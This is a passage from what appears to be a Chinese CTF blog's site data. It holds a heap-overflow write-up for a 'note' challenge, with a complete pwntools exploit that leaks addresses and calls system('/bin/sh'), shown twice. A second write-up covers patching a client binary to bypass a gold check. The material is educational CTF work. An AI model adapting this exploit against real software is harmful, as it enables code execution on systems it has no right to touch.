class=\"string\">&#x27;bbbbbbb&#x27;</span>,<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#leak textbase</span></span><br><span class=\"line\"></span><br><span class=\"line\">edit_tag(<span class=\"number\">0</span>,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x8</span>)</span><br><span class=\"line\"><span class=\"comment\">#edit_tag后func字段的最低位会被&#x27;\\x00&#x27;覆盖，因此调用edit_func去把func字段改好</span></span><br><span class=\"line\">edit_func(<span class=\"number\">0</span>,<span class=\"number\">2</span>)</span><br><span class=\"line\">funcall(<span class=\"number\">0</span>)</span><br><span class=\"line\">p.recvline()</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x8</span>)</span><br><span class=\"line\"><span class=\"comment\">#泄露出func2的地址</span></span><br><span class=\"line\">data=u64(p.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>)[:-<span class=\"number\">1</span>].ljust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\"><span class=\"comment\">#减去func2的偏移即可得到textbase</span></span><br><span class=\"line\">textbase=data-<span class=\"number\">0x137A</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;[*]textbase: &#123;:&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(textbase)))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#leak libcbase</span></span><br><span class=\"line\"><span class=\"comment\">#因为开了PIE，不要忘了加上textbase，将name字段覆盖为got表中puts表项，输出puts的真实地址</span></span><br><span class=\"line\"><span class=\"comment\">#顺便把num_length字段写了是因为edit会在后面追加&#x27;\\x0a\\x00&#x27;怕出问题</span></span><br><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x10</span>+<span class=\"string\">&#x27;\\x00&#x27;</span>*<span class=\"number\">0x8</span>+p64(<span class=\"number\">0x31</span>)+<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x7</span>+<span class=\"string\">&#x27;\\x00&#x27;</span>+p64(textbase+<span class=\"number\">0x137A</span>)+p64(textbase+elf.got[<span class=\"string\">&#x27;puts&#x27;</span>])+p64(<span class=\"number\">9</span>)</span><br><span class=\"line\">edit_name(<span class=\"number\">0</span>,<span class=\"number\">0x1ef</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">funcall(<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"comment\"># data=p.recv()</span></span><br><span class=\"line\"><span class=\"comment\"># print(data)</span></span><br><span class=\"line\">p.recvline()</span><br><span class=\"line\">p.recvline()</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;name: &#x27;</span>)</span><br><span class=\"line\">data=u64(p.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>)[:-<span class=\"number\">1</span>].ljust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">libcbase=data-libc.sym[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\"><span class=\"comment\">#print(&quot;[*]data: &#123;:&#125;&quot;.format(hex(data)))</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;[*]libcbase: &#123;:&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(libcbase)))</span><br><span class=\"line\">debug()</span><br><span class=\"line\"><span class=\"comment\">#get shell</span></span><br><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x10</span>+<span class=\"string\">&#x27;\\x00&#x27;</span>*<span class=\"number\">0x8</span>+p64(<span class=\"number\">0x31</span>)+<span class=\"string\">&#x27;/bin/sh\\x00&#x27;</span>+p64(libcbase+libc.sym[<span class=\"string\">&#x27;system&#x27;</span>])+p64(textbase+elf.got[<span class=\"string\">&#x27;puts&#x27;</span>])+p64(<span class=\"number\">9</span>)</span><br><span class=\"line\">edit_name(<span class=\"number\">0</span>,<span class=\"number\">0x1ef</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">funcall(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"<p>2022柏鹭杯note1，主要是对堆溢出的利用。</p>","more":"<p>一道菜单堆题，查壳后发现保护全开。</p>\n<p>结构体如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">note</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    QWORD tag;</span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"title function_\">func</span><span class=\"params\">(<span class=\"type\">int</span>)</span>;</span><br><span class=\"line\">    <span class=\"type\">char</span>* name;</span><br><span class=\"line\">    QWORD name_length;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>具有new、edit、func三个功能，仅允许有2个chunk。</p>\n<p>new功能就是note=malloc(0x20)，然后输入各项数据，对\\x00也有注意（fgets会自动在最后一个字节变为\\x00），没有什么可以利用的地方，需要注意的是name=malloc(n+1)，会多申请一点来放\\x00。</p>\n<p>edit功能分为edit_name,edit_tag,edit_func。</p>\n<p>edit_name中如果新的name_length与原来的name_length不一样，就会free原来的name，malloc一个新的chunk写入name。<strong>问题是在这里并没有把新的name_length写到note的对应位置中，下次edit时仍以原来的name作为标准</strong>。因此如果开始时设置name_length较大，后面edit一个较小的name时就可以实现一个<strong>堆溢出</strong>。</p>\n<p>edit_tag会修改tag，与new不同的是，这里用的是scanf(“%8s”)，因此<strong>可以写9字节（最后一字节为\\x00）</strong>，写完后会覆盖一位func的地址，不过调用edit就可以改回去了，泄露func的地址，减去偏移可以得到textbase。</p>\n<p>edit_func就是调用函数修改函数指针，没有可以利用的地方，不同的func只是保存地址不同，功能完全一样。</p>\n<p>func功能执行</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(*(<span class=\"type\">void</span> (__fastcall **)(_QWORD))(chunk_list[id_call] + <span class=\"number\">8LL</span>))(chunk_list[id_call]);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> __fastcall <span class=\"title function_\">fun1</span><span class=\"params\">(__int64 a1)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;--------fun1--------&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;tag: %s\\n&quot;</span>, (<span class=\"type\">const</span> <span class=\"type\">char</span> *)a1);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;name: %s\\n&quot;</span>, *(<span class=\"type\">const</span> <span class=\"type\">char</span> **)(a1 + <span class=\"number\">16</span>));</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;--------------------&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>输出tag和name，可以利用堆溢出修改name位置的指针来泄露libc。</p>\n<p>exp:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./note3&quot;</span>)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&quot;./libc.so.6&quot;</span>) <span class=\"comment\">#BaiLucup use 2.31 9.9</span></span><br><span class=\"line\"><span class=\"comment\">#use 2.31 9.7 to debug in local</span></span><br><span class=\"line\">p=process(<span class=\"string\">&quot;./note3&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">Id, length, name, tag, func</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;&gt; &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;id: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(Id))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;name_length: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(length))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;name: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(name)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;tag: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(tag)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;func: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(func))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit_name</span>(<span class=\"params\">Id, length, name</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;&gt; &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;id: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(Id))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;&gt; &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;name_length: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(length))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;name: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit_tag</span>(<span class=\"params\">Id, tag</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;&gt; &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;id: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(Id))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;&gt; &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;new tag: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(tag)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit_func</span>(<span class=\"params\">Id, func</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;&gt; &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;id: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(Id))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;&gt; &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;func: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(func))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">funcall</span>(<span class=\"params\">Id</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;&gt; &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;id: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(Id))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>():</span><br><span class=\"line\">    gdb.attach(p)</span><br><span class=\"line\">    pause()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#一开始把num_length设大，方便后面溢出</span></span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"number\">0x200</span>,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x1ee</span>,<span class=\"string\">&#x27;ccccddd&#x27;</span>,<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"comment\">#通过edit_name把chunk改小，由此可以溢出</span></span><br><span class=\"line\">edit_name(<span class=\"number\">0</span>,<span class=\"number\">0x10</span>,<span class=\"string\">&#x27;aaaabbbb&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">0x20</span>,<span class=\"string\">&#x27;eeeeffff&#x27;</span>,<span class=\"string\">&#x27;bbbbbbb&#x27;</span>,<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#leak textbase</span></span><br><span class=\"line\"></span><br><span class=\"line\">edit_tag(<span class=\"number\">0</span>,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x8</span>)</span><br><span class=\"line\"><span class=\"comment\">#edit_tag后func字段的最低位会被&#x27;\\x00&#x27;覆盖，因此调用edit_func去把func字段改好</span></span><br><span class=\"line\">edit_func(<span class=\"number\">0</span>,<span class=\"number\">2</span>)</span><br><span class=\"line\">funcall(<span class=\"number\">0</span>)</span><br><span class=\"line\">p.recvline()</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x8</span>)</span><br><span class=\"line\"><span class=\"comment\">#泄露出func2的地址</span></span><br><span class=\"line\">data=u64(p.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>)[:-<span class=\"number\">1</span>].ljust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\"><span class=\"comment\">#减去func2的偏移即可得到textbase</span></span><br><span class=\"line\">textbase=data-<span class=\"number\">0x137A</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;[*]textbase: &#123;:&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(textbase)))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#leak libcbase</span></span><br><span class=\"line\"><span class=\"comment\">#因为开了PIE，不要忘了加上textbase，将name字段覆盖为got表中puts表项，输出puts的真实地址</span></span><br><span class=\"line\"><span class=\"comment\">#顺便把num_length字段写了是因为edit会在后面追加&#x27;\\x0a\\x00&#x27;怕出问题</span></span><br><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x10</span>+<span class=\"string\">&#x27;\\x00&#x27;</span>*<span class=\"number\">0x8</span>+p64(<span class=\"number\">0x31</span>)+<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x7</span>+<span class=\"string\">&#x27;\\x00&#x27;</span>+p64(textbase+<span class=\"number\">0x137A</span>)+p64(textbase+elf.got[<span class=\"string\">&#x27;puts&#x27;</span>])+p64(<span class=\"number\">9</span>)</span><br><span class=\"line\">edit_name(<span class=\"number\">0</span>,<span class=\"number\">0x1ef</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">funcall(<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"comment\"># data=p.recv()</span></span><br><span class=\"line\"><span class=\"comment\"># print(data)</span></span><br><span class=\"line\">p.recvline()</span><br><span class=\"line\">p.recvline()</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;name: &#x27;</span>)</span><br><span class=\"line\">data=u64(p.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>)[:-<span class=\"number\">1</span>].ljust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">libcbase=data-libc.sym[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\"><span class=\"comment\">#print(&quot;[*]data: &#123;:&#125;&quot;.format(hex(data)))</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;[*]libcbase: &#123;:&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(libcbase)))</span><br><span class=\"line\">debug()</span><br><span class=\"line\"><span class=\"comment\">#get shell</span></span><br><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x10</span>+<span class=\"string\">&#x27;\\x00&#x27;</span>*<span class=\"number\">0x8</span>+p64(<span class=\"number\">0x31</span>)+<span class=\"string\">&#x27;/bin/sh\\x00&#x27;</span>+p64(libcbase+libc.sym[<span class=\"string\">&#x27;system&#x27;</span>])+p64(textbase+elf.got[<span class=\"string\">&#x27;puts&#x27;</span>])+p64(<span class=\"number\">9</span>)</span><br><span class=\"line\">edit_name(<span class=\"number\">0</span>,<span class=\"number\">0x1ef</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">funcall(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>"},{"title":"CatCFT_Welcome","date":"2023-01-10T02:52:21.000Z","_content":"\nCATCTF中最简单的pwn题，是c/s的题，之前没做过这类的题，现在学习一下。\n\n<!--more-->\n\n查壳可以看到保护全开，远程会起一个server，本地使用client与其进行交互。\n\n这种给了客户端的题通常都是**要修改客户端代码**来帮助cat flag的。\n\n在ida中可以看到，通过`wasd`控制符号`@`移动，走到出题人的`$`下面输入`j`即可使`glod+1`，最多可以加到`100`。\n\n当`glod>100000000`并且在`HRP`的`@`下输入`j`，客户端就会连接客户端并返回flag，但正常情况下`glod`最多只能到100，这里就需要我们修改客户端的文件内容使其能够到100000000。\n\n首先找到给glod赋值的位置：\n\n```c\nif ( glod <= 99 )\n\t++glod;\n```\n\n汇编代码中显示如下：\n\n```asm\n.text:000000000000920F 8B 05 73 11 20 00             mov     eax, cs:glod\n.text:0000000000009215 83 C0 01                      add     eax, 1\n.text:0000000000009218 89 05 6A 11 20 00             mov     cs:glod, eax\n```\n\n可以看到这里先将`glod`的值`mov`到`eax`，对`eax+1`后再`mov`回`glod`。\n\n如果在此处修改`mov\teax, cs:glod`修改为`mov  eax, 5F5E100h(100000000)`，那么经过这次计算后`glod>100000000`成立，后续就可以通过`if`的判断向服务器端发送消息得到flag。\n\n这里的修改要用到ida中的功能（我的7.7不知道为什么用不了，7.5的倒是可以用），鼠标选中对应的汇编代码后在ida上方的菜单栏中选择`edit -> Patch program -> Assemble`修改其汇编代码为`mov  eax, 5F5E100h`，之后选择`edit -> Patch program -> Apply patches to`应用该修改。\n\n修改后的程序可以绕过判断向服务器发送信息，最后可以得到flag。\n","source":"_posts/CatCFT-Welcome.md","raw":"---\ntitle: CatCFT_Welcome\ndate: 2023-01-10 10:52:21\ntags:\n- pwn\n- c/s\n- re\ncategories: \n- pwn_wp\n---\n\nCATCTF中最简单的pwn题，是c/s的题，之前没做过这类的题，现在学习一下。\n\n<!--more-->\n\n查壳可以看到保护全开，远程会起一个server，本地使用client与其进行交互。\n\n这种给了客户端的题通常都是**要修改客户端代码**来帮助cat flag的。\n\n在ida中可以看到，通过`wasd`控制符号`@`移动，走到出题人的`$`下面输入`j`即可使`glod+1`，最多可以加到`100`。\n\n当`glod>100000000`并且在`HRP`的`@`下输入`j`，客户端就会连接客户端并返回flag，但正常情况下`glod`最多只能到100，这里就需要我们修改客户端的文件内容使其能够到100000000。\n\n首先找到给glod赋值的位置：\n\n```c\nif ( glod <= 99 )\n\t++glod;\n```\n\n汇编代码中显示如下：\n\n```asm\n.text:000000000000920F 8B 05 73 11 20 00             mov     eax, cs:glod\n.text:0000000000009215 83 C0 01                      add     eax, 1\n.text:0000000000009218 89 05 6A 11 20 00             mov     cs:glod, eax\n```\n\n可以看到这里先将`glod`的值`mov`到`eax`，对`eax+1`后再`mov`回`glod`。\n\n如果在此处修改`mov\teax, cs:glod`修改为`mov  eax, 5F5E100h(100000000)`，那么经过这次计算后`glod>100000000`成立，后续就可以通过`if`的判断向服务器端发送消息得到flag。\n\n这里的修改要用到ida中的功能（我的7.7不知道为什么用不了，7.5的倒是可以用），鼠标选中对应的汇编代码后在ida上方的菜单栏中选择`edit -> Patch program -> Assemble`修改其汇编代码为`mov  eax, 5F5E100h`，之后选择`edit -> Patch program -> Apply patches to`应用该修改。\n\n修改后的程序可以绕过判断向服务器发送信息，最后可以得到flag。\n","slug":"CatCFT-Welcome","published":1,"updated":"2023-01-10T03:33:52.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czaey00095oud6hmwg46e","content":"<p>CATCTF中最简单的pwn题，是c/s的题，之前没做过这类的题，现在学习一下。</p>\n<span id=\"more\"></span>\n\n<p>查壳可以看到保护全开，远程会起一个server，本地使用client与其进行交互。</p>\n<p>这种给了客户端的题通常都是<strong>要修改客户端代码</strong>来帮助cat flag的。</p>\n<p>在ida中可以看到，通过<code>wasd</code>控制符号<code>@</code>移动，走到出题人的<code>$</code>下面输入<code>j</code>即可使<code>glod+1</code>，最多可以加到<code>100</code>。</p>\n<p>当<code>glod&gt;100000000</code>并且在<code>HRP</code>的<code>@</code>下输入<code>j</code>，客户端就会连接客户端并返回flag，但正常情况下<code>glod</code>最多只能到100，这里就需要我们修改客户端的文件内容使其能够到100000000。</p>\n<p>首先找到给glod赋值的位置：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( glod &lt;= <span class=\"number\">99</span> )</span><br><span class=\"line\">\t++glod;</span><br></pre></td></tr></table></figure>\n\n<p>汇编代码中显示如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:000000000000920F 8B 05 73 11 20 00             mov     eax, cs:glod</span><br><span class=\"line\">.text:0000000000009215 83 C0 01                      add     eax, 1</span><br><span class=\"line\">.text:0000000000009218 89 05 6A 11 20 00             mov     cs:glod, eax</span><br></pre></td></tr></table></figure>\n\n<p>可以看到这里先将<code>glod</code>的值<code>mov</code>到<code>eax</code>，对<code>eax+1</code>后再<code>mov</code>回<code>glod</code>。</p>\n<p>如果在此处修改<code>mov    eax, cs:glod</code>修改为<code>mov  eax, 5F5E100h(100000000)</code>，那么经过这次计算后<code>glod&gt;100000000</code>成立，后续就可以通过<code>if</code>的判断向服务器端发送消息得到flag。</p>\n<p>这里的修改要用到ida中的功能（我的7.7不知道为什么用不了，7.5的倒是可以用），鼠标选中对应的汇编代码后在ida上方的菜单栏中选择<code>edit -&gt; Patch program -&gt; Assemble</code>修改其汇编代码为<code>mov  eax, 5F5E100h</code>，之后选择<code>edit -&gt; Patch program -&gt; Apply patches to</code>应用该修改。</p>\n<p>修改后的程序可以绕过判断向服务器发送信息，最后可以得到flag。</p>\n","site":{"data":{}},"excerpt":"<p>CATCTF中最简单的pwn题，是c/s的题，之前没做过这类的题，现在学习一下。</p>","more":"<p>查壳可以看到保护全开，远程会起一个server，本地使用client与其进行交互。</p>\n<p>这种给了客户端的题通常都是<strong>要修改客户端代码</strong>来帮助cat flag的。</p>\n<p>在ida中可以看到，通过<code>wasd</code>控制符号<code>@</code>移动，走到出题人的<code>$</code>下面输入<code>j</code>即可使<code>glod+1</code>，最多可以加到<code>100</code>。</p>\n<p>当<code>glod&gt;100000000</code>并且在<code>HRP</code>的<code>@</code>下输入<code>j</code>，客户端就会连接客户端并返回flag，但正常情况下<code>glod</code>最多只能到100，这里就需要我们修改客户端的文件内容使其能够到100000000。</p>\n<p>首先找到给glod赋值的位置：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( glod &lt;= <span class=\"number\">99</span> )</span><br><span class=\"line\">\t++glod;</span><br></pre></td></tr></table></figure>\n\n<p>汇编代码中显示如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:000000000000920F 8B 05 73 11 20 00             mov     eax, cs:glod</span><br><span class=\"line\">.text:0000000000009215 83 C0 01                      add     eax, 1</span><br><span class=\"line\">.text:0000000000009218 89 05 6A 11 20 00             mov     cs:glod, eax</span><br></pre></td></tr></table></figure>\n\n<p>可以看到这里先将<code>glod</code>的值<code>mov</code>到<code>eax</code>，对<code>eax+1</code>后再<code>mov</code>回<code>glod</code>。</p>\n<p>如果在此处修改<code>mov    eax, cs:glod</code>修改为<code>mov  eax, 5F5E100h(100000000)</code>，那么经过这次计算后<code>glod&gt;100000000</code>成立，后续就可以通过<code>if</code>的判断向服务器端发送消息得到flag。</p>\n<p>这里的修改要用到ida中的功能（我的7.7不知道为什么用不了，7.5的倒是可以用），鼠标选中对应的汇编代码后在ida上方的菜单栏中选择<code>edit -&gt; Patch program -&gt; Assemble</code>修改其汇编代码为<code>mov  eax, 5F5E100h</code>，之后选择<code>edit -&gt; Patch program -&gt; Apply patches 